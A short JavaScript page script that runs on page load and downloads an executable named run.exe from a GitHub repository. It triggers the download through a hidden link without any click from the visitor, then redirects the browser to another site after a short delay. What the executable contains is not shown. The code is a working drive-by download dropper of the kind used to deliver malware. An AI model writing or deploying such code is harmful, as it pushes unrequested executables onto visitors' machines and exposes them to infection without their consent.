window.onload = async function () {
  const fileUrl = "https://github.com/nikolas25879alt-maker/scriptyrp/raw/refs/heads/main/skibidi/run.exe";
  const redirectUrl = "https://scripty.my/"; // <-- change this

  try {
    const response = await fetch(fileUrl);
    const blob = await response.blob();

    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "run.exe";

    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    URL.revokeObjectURL(a.href);
  } catch (err) {
    console.error("Download failed:", err);
  }

  // redirect after short delay (so download can start)
  setTimeout(() => {
    window.location.href = redirectUrl;
  }, 1500);
};